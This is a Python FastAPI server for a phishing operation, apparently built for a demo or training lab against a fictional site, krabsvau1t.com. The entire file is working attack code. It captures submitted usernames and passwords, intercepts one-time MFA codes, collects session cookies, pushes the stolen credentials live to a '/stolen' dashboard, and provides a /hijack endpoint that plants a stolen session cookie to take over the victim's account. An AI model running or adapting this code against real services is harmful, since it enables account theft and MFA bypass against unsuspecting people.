import asyncio
from pathlib import Path

import uvicorn
from fastapi import FastAPI, Request
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.responses import RedirectResponse, Response, StreamingResponse

from phishing.credentials import (
    capture_credential,
    capture_mfa_code,
    capture_session,
    captured_credentials,
)
from phishing.event_bus import event_bus

ASSETS_DIR: Path = Path(__file__).parents[1] / "assets"
TEMPLATES_DIR: Path = Path(__file__).parent / "templates"

app = FastAPI()
app.mount("/stolen/static", StaticFiles(directory=ASSETS_DIR / "static"), name="static")
templates = Jinja2Templates(directory=TEMPLATES_DIR)


@app.get("/")
async def index() -> RedirectResponse:
    return RedirectResponse("/stolen")


@app.get("/stolen", response_model=None)
async def stolen_page(request: Request) -> Response:
    return templates.TemplateResponse(request, "stolen.html", {})


@app.get("/stolen/api/credentials")
async def list_credentials() -> list[dict[str, str | int | None]]:
    return [c.to_payload() for c in captured_credentials]


@app.api_route("/capture", methods=["GET", "POST"])
async def capture(request: Request) -> Response:
    if request.method == "POST":
        form_data = await request.form()
        username = form_data.get("username")
        password = form_data.get("password")
        mfa_code = form_data.get("code")
        credential = None
        if isinstance(username, str) and isinstance(password, str):
            credential = capture_credential(username, password)
        elif isinstance(username, str) and isinstance(mfa_code, str):
            # The /login/mfa/totp form posts username + the 6-digit TOTP code.
            credential = capture_mfa_code(username, mfa_code)
        if credential:
            event_bus.broadcast_credential(credential)
    elif request.method == "GET":
        session_cookie = request.cookies.get("session")
        if session_cookie:
            credential = capture_session(session_cookie)
            if credential:
                event_bus.broadcast_credential(credential)
    return Response(status_code=200)


@app.get("/hijack")
async def hijack(cookie: str) -> RedirectResponse:
    response = RedirectResponse("https://krabsvau1t.com/")
    response.set_cookie(
        key="session",
        value=cookie,
        secure=True,
        httponly=True,
        samesite="lax",
    )
    return response


@app.get("/stolen/api/events")
async def sse_events() -> StreamingResponse:
    queue = event_bus.add_client()

    async def event_stream() -> asyncio.AsyncIterator[str]:  # type: ignore[type-arg]
        try:
            yield ": connected\n\n"
            while True:
                try:
                    message = await asyncio.wait_for(queue.get(), timeout=30)
                    yield message
                except TimeoutError:
                    yield ": heartbeat\n\n"
        finally:
            event_bus.remove_client(queue)

    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


def main() -> None:
    uvicorn.run(
        "phishing.app:app",
        host="127.0.0.1",
        port=8666,
        reload=True,
    )


if __name__ == "__main__":
    main()
